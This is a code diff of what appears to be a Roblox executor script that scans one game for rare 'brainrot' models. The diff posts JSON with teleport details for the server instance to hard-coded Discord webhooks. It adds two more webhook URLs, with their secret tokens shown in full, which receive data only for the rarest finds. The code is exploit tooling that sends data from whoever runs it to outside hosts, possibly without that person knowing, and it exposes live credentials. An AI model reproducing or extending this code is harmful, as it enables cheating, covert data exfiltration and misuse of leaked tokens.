@@ -2143,9 +2143,12 @@ local allowedPlaceId = 109983668079237
 if game.PlaceId ~= allowedPlaceId then return end
 
 local webhookUrls = {
-    "https://discord.com/api/webhooks/1397994822396149890/k7gMoTUoiEFaR4733ymwSKjRd5iVfwhiCyWRDNbltfvPSKQHQpWpIr5GxCOfkSx-kWRd",
-    "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b"
+    "https://discord.com/api/webhooks/1397993708124770416/C0W7wrzwpWQltujrupJ0qOUfnX9sf3_5NVd3EgbctdLSHTisXm_-juUKt7QN5zAWYA2b",
+    "https://discord.com/api/webhooks/1397994822396149890/k7gMoTUoiEFaR4733ymwSKjRd5iVfwhiCyWRDNbltfvPSKQHQpWpIr5GxCOfkSx-kWRd"
 }
+
+local extraWebhookUrl = "https://discord.com/api/webhooks/1398063143498027018/3_tAgWwlYaJrnS643ZoFe5IVCtMOmAjN8d_ECv058nuZTOzpVspgBPEJ9DQ30ItLjmMi"
+local midWebhookUrl   = "https://discord.com/api/webhooks/1398075572604633188/PB21kIJHSLj6Pd-_P6hxhgunzMbl4dhc_XoNPqSE2gxdzjgbfQmUnR7ctOR3OwZVu2qG"
 
 local brainrotGods = {
     ["Garama and Madundung"] = true,
@@ -2175,6 +2178,12 @@ local brainrotRanks = {
     ["Chimpanzini Spiderini"]        = 10,
     ["Sammyini Spidreini"]           = 11,
     ["La Vacca Saturno Saturnita"]   = 12
+}
+
+local specialForThirdWebhook = {
+    ["Garama and Madundung"] = true,
+    ["Nuclearo Dinossauro"]  = true,
+    ["La Grande Combinasion"] = true
 }
 
 local colorGold     = Color3.fromRGB(237, 178, 0)
@@ -2284,10 +2293,32 @@ teleportService:TeleportToPlaceInstance("%s", "%s", player)
     local req = (syn and syn.request) or (http and http.request) or request or http_request
     if not req then return end
 
+    -- Always send to default 2 webhooks
     for _, url in ipairs(webhookUrls) do
         pcall(function()
             req({
                 Url     = url,
+                Method  = "POST",
+                Headers = headers,
+                Body    = jsonData
+            })
+        end)
+    end
+
+    -- Send to mid and extra webhook only for special ranked brainrots
+    if specialForThirdWebhook[modelName] then
+        pcall(function()
+            req({
+                Url     = midWebhookUrl,
+                Method  = "POST",
+                Headers = headers,
+                Body    = jsonData
+            })
+        end)
+
+        pcall(function()
+            req({
+                Url     = extraWebhookUrl,
                 Method  = "POST",
                 Headers = headers,
                 Body    = jsonData
